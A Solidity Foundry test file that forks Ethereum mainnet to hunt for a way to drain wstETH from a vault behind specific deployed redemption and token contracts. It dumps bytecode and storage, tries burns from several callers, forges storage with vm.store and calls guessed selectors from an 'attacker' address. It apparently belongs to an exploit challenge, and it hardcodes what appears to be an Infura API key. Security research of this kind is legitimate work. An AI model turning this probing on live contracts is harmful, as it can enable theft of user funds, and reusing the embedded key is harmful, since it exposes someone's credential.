// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract BurnStorageSlot is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TASSET_IMPL = 0xD1A622566F277AA76c3C47A30469432AAec95E38;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DetailedSlotAnalysis() public view {
        console.log("=== DETAILED BURN STORAGE SLOT ANALYSIS ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Trace opcodes from 3480 to 3500 (before SLOAD at 3490)
        console.log("Opcodes 3480-3500:");

        uint i = 3480;
        while (i < 3500 && i < code.length) {
            uint8 op = uint8(code[i]);

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x5b) console.log(i, "JUMPDEST");
            if (op == 0x50) console.log(i, "POP");

            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }

                if (size <= 4) {
                    console.log(i, "PUSH:", val);
                } else if (size == 20) {
                    console.log(i, "PUSH20 (address)");
                } else {
                    console.log(i, "PUSH large value");
                }

                i += size;
            }

            i++;
        }

        // The large value at 3485 is interesting
        // Let me decode it
        console.log("\nDecoding value at 3485:");
        uint256 largeVal = 4144550945433692923233580071665760779274245581160462775050547530563583;

        // Convert to bytes to see if it's a selector or address packed
        console.log("As hex:");
        console.logBytes32(bytes32(largeVal));

        // The low 160 bits might be an address
        address lowAddr = address(uint160(largeVal));
        console.log("Low 160 bits as address:", lowAddr);
        console.log("Has code:", lowAddr.code.length > 0);

        // Or it could be hash of something for SLOAD
        console.log("Value mod 2^160:", uint256(uint160(largeVal)));
    }

    function test_CheckAllRedemption1Storage() public view {
        console.log("=== ALL REDEMPTION_1 STORAGE SLOTS ===\n");

        console.log("Storage slots 0-20:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);

                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0) {
                    console.log("  -> Contract:", addr);
                }
            }
        }

        // Check computed slots
        console.log("\nChecking known computed slots:");

        // TASSET might be stored in a computed slot
        bytes32 tassetSlot = keccak256(abi.encode(uint256(2)));
        bytes32 tassetVal = vm.load(REDEMPTION_1, tassetSlot);
        console.log("keccak(2):");
        console.logBytes32(tassetVal);
    }

    function test_TASSetImplementationAnalysis() public view {
        console.log("=== TASSET IMPLEMENTATION ANALYSIS ===\n");

        console.log("TASSET (proxy):", TASSET);
        console.log("TASSET impl:", TASSET_IMPL);
        console.log("Impl code size:", TASSET_IMPL.code.length);

        // Check TASSET storage
        console.log("\nTASSET storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(TASSET, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check implementation storage
        console.log("\nTASSET impl storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(TASSET_IMPL, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check who can call burn on TASSET
        console.log("\nTASSET burn access:");

        // Check minters array/mapping
        bytes32 mintersSlot = keccak256(abi.encode(REDEMPTION_1, uint256(5)));
        bytes32 isMinter = vm.load(TASSET, mintersSlot);
        console.log("REDEMPTION_1 is minter:");
        console.logBytes32(isMinter);
    }

    function test_TryBurnAsTASSETMinter() public {
        console.log("=== TRYING BURN AS TASSET MINTER ===\n");

        // Find who can burn TASSET
        // Usually either:
        // 1. Only owner
        // 2. Only approved minters/burners
        // 3. Token holder can burn their own

        // Try burning from different callers
        address[] memory callers = new address[](5);
        callers[0] = attacker;
        callers[1] = REDEMPTION_1;
        callers[2] = REDEMPTION_0;
        callers[3] = TASSET_IMPL;
        callers[4] = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // Timelock/owner

        for (uint i = 0; i < callers.length; i++) {
            // Give caller TASSET
            deal(TASSET, callers[i], 1000e18);

            vm.startPrank(callers[i]);

            console.log("Trying burn as:", callers[i]);
            (bool s, bytes memory d) = TASSET.call(
                abi.encodeWithSignature("burn(uint256)", 100e18)
            );
            console.log("  Success:", s);
            if (!s && d.length >= 4) {
                console.log("  Error:");
                console.logBytes4(bytes4(d));
            }

            vm.stopPrank();
        }
    }

    function test_DirectBurnFromRedemption1Context() public {
        console.log("=== BURN FROM REDEMPTION_1 CONTEXT ===\n");

        // What if we call TASSET.burn THROUGH REDEMPTION_1's delegatecall?

        // The DELEGATECALL at 1045 loads from slot 1 (pendingOwner)
        // If we set pendingOwner to TASSET, then calling certain functions
        // would delegatecall to TASSET

        // First, set pendingOwner to TASSET
        vm.store(REDEMPTION_1, bytes32(uint256(1)), bytes32(uint256(uint160(TASSET))));

        bytes32 slot1 = vm.load(REDEMPTION_1, bytes32(uint256(1)));
        console.log("pendingOwner after store:");
        console.logBytes32(slot1);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Now try functions that use DELEGATECALL at 1045
        bytes4[] memory sels = new bytes4[](5);
        sels[0] = bytes4(0xcff50c6e);
        sels[1] = bytes4(0xeda72134);
        sels[2] = bytes4(0xf2fde38b);
        sels[3] = bytes4(0xfd424ea8);
        sels[4] = bytes4(0x578063ed);

        vm.startPrank(attacker);

        for (uint i = 0; i < sels.length; i++) {
            console.log("Trying selector:");
            console.logBytes4(sels[i]);

            (bool s,) = REDEMPTION_1.call{gas: 1000000}(
                abi.encodeWithSelector(sels[i], attacker)
            );
            console.log("  Success:", s);

            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);
            if (vaultNow < vaultBefore) {
                console.log("*** VAULT DRAINED! ***");
                break;
            }
        }

        vm.stopPrank();

        console.log("\nVault change:", int256(IERC20(wstETH).balanceOf(VAULT)) - int256(vaultBefore));
    }

    function test_ActionChainingHypothesis() public {
        console.log("=== ACTION CHAINING HYPOTHESIS ===\n");

        // The hint: "extract assets to a proxy attacker owns, then extract from that proxy"

        // What if:
        // 1. Attacker deploys a contract that can receive wstETH
        // 2. Somehow makes REDEMPTION_1 call RC.redeem with that contract as recipient
        // 3. Attacker extracts from their contract

        // But RC.redeem recipient = CALLER in REDEMPTION_1 code
        // So the recipient would be whoever called the function

        // UNLESS... there's a different code path where recipient comes from storage

        // Let me check if REDEMPTION_0 has a different pattern
        bytes memory r0Code = REDEMPTION_0.code;

        // Find RC.redeem at offset 5011
        console.log("Checking REDEMPTION_0 RC.redeem pattern:");

        for (uint i = 5000; i < 5100 && i < r0Code.length; i++) {
            uint8 op = uint8(r0Code[i]);

            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0x63) {
                bytes4 sel = bytes4(bytes.concat(r0Code[i+1], r0Code[i+2], r0Code[i+3], r0Code[i+4]));
                if (sel == bytes4(0x7bde82f2)) {
                    console.log(i, "PUSH4 RC.redeem");
                }
            }
        }
    }
}
